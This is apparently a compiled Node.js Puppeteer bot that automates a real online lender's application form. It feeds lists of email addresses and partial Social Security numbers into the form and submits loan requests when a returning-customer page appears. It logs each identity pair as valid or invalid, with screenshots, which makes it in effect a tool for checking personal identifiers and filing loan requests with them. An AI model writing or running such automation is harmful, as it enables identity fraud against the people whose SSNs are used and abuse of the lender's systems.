"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.getCredentialInformationScrapper = exports.REFERRER_HOSTS_URL = exports.REFERRER_HOSTS = void 0;
const constants_1 = require("./constants");
const utils_1 = require("./utils");
const path_1 = __importDefault(require("path"));
const fs_1 = __importDefault(require("fs"));
const logger_1 = __importDefault(require("./logger/logger"));
var REFERRER_HOSTS;
(function (REFERRER_HOSTS) {
    REFERRER_HOSTS["STORE_FRONTLOANS"] = "forms.storefrontloans.com";
})(REFERRER_HOSTS || (exports.REFERRER_HOSTS = REFERRER_HOSTS = {}));
exports.REFERRER_HOSTS_URL = [
    'forms.storefrontloans.com',
    'intmconnect.com',
];
const getLoanAmountValue = () => constants_1.LOAN_AMOUNTS[(0, utils_1.getRamdomValue)(0, constants_1.LOAN_AMOUNTS.length - 1)];
const isReferrerHostURL = (url) => {
    const host = new URL(url).host;
    return exports.REFERRER_HOSTS_URL.some((referrerHost) => host.includes(referrerHost));
};
// URLS //
const PAGE_URL = 'https://brighter.loans/';
// SELECTORS //
const loanAmountSelector = '#amount';
const emailSelector = '#email';
const ssnSelector = '#shortSSN';
const submitButtonSelector = '#homepage-form > div.d-grid > button';
const formSelector = '#homepage-form';
const submitLoanRequestButtonSelector = '#btnSubmit';
const termsAndConditionsCheckBoxSelector = '#termsAgreed';
const getCredentialInformationScrapper = (browser, credential, validWriteLineOnFile, invalidWriteLineOnFile, validFileName) => __awaiter(void 0, void 0, void 0, function* () {
    const page = yield browser.newPage();
    try {
        const loanAmountValue = getLoanAmountValue();
        const screenshotRedirectDirectory = path_1.default.join(`${__dirname}/data/screenshots-redirect/${validFileName}`);
        if (!fs_1.default.existsSync(screenshotRedirectDirectory)) {
            fs_1.default.mkdirSync(screenshotRedirectDirectory, { recursive: true });
        }
        const screenshotRedirectPath = path_1.default.join(`${screenshotRedirectDirectory}/${credential.email}.png`);
        yield page.goto(PAGE_URL, {
            waitUntil: 'networkidle2',
        });
        //TODO: Verify this session code
        const session = yield page.target().createCDPSession();
        yield session.send('Page.enable');
        yield session.send('Page.setWebLifecycleState', { state: 'active' });
        yield page.select(loanAmountSelector, loanAmountValue);
        yield page.type(emailSelector, credential.email);
        yield page.type(ssnSelector, credential.ssn);
        const form = yield page.$(formSelector);
        yield Promise.all([
            yield (form === null || form === void 0 ? void 0 : form.evaluate((form) => form.submit())),
            yield page.waitForNavigation({
                timeout: 0,
                waitUntil: 'networkidle0',
            }),
        ]);
        const isWelcomeBack = (yield page.$(submitLoanRequestButtonSelector))
            ? true
            : false;
        if (isWelcomeBack) {
            // await page.screenshot({
            //   path: screenshotPath, //ACTIVE TO SCREENSHOT WHEN IS WELCOME BACK
            // });
            yield page.click(termsAndConditionsCheckBoxSelector);
            const submitLoanRequestButton = yield page.$(submitLoanRequestButtonSelector);
            yield Promise.all([
                yield (submitLoanRequestButton === null || submitLoanRequestButton === void 0 ? void 0 : submitLoanRequestButton.evaluate((e) => e.click())),
                logger_1.default.warn(`VALIDATING: ${credential.email}`),
                yield page.waitForNavigation({
                    timeout: 0,
                    waitUntil: 'networkidle2',
                }),
            ]);
            yield new Promise((r) => setTimeout(r, 2000));
            if ((0, utils_1.isInvalidURLRedirect)(page.url(), constants_1.INVALID_URL_REDIRECT)) {
                yield page.close();
                return logger_1.default.error(`INVALID URL REDIRECT: ${page.url()} - EMAIL:${credential.email} SSN=${credential.ssn} LOAN_AMOUNT=${loanAmountValue}`);
            }
            if (isReferrerHostURL(page.url())) {
                const firstURL = page.url();
                const firstURLHost = new URL(firstURL).host;
                logger_1.default.warn(`VALIDATING REFERRER_HOSTS [${firstURLHost}] : ${credential.email}`);
                yield page.waitForNavigation({
                    timeout: 0,
                    waitUntil: 'networkidle2',
                });
                const referrerURL = page.url();
                const outputMessage = (0, utils_1.generateOutputMessage)(credential, loanAmountValue, isWelcomeBack, firstURL, referrerURL);
                logger_1.default.info(outputMessage);
                validWriteLineOnFile(outputMessage);
                yield page.screenshot({
                    path: screenshotRedirectPath,
                });
                return 0;
            }
            yield page.screenshot({
                path: screenshotRedirectPath,
            });
            const outputMessage = (0, utils_1.generateOutputMessage)(credential, loanAmountValue, isWelcomeBack, page.url());
            yield new Promise((r) => setTimeout(r, 4000));
            logger_1.default.info(outputMessage);
            validWriteLineOnFile(outputMessage);
            yield page.close();
        }
        else {
            const outputMessage = (0, utils_1.generateOutputMessage)(credential, loanAmountValue, isWelcomeBack);
            invalidWriteLineOnFile(outputMessage);
            logger_1.default.error(outputMessage);
            yield page.close();
        }
    }
    catch (error) {
        logger_1.default.error(`ERROR WITH ${credential.email}!!!`);
        logger_1.default.error(`getCredentialInformationScrapper ERROR: ${error}`);
        yield page.close();
    }
});
exports.getCredentialInformationScrapper = getCredentialInformationScrapper;
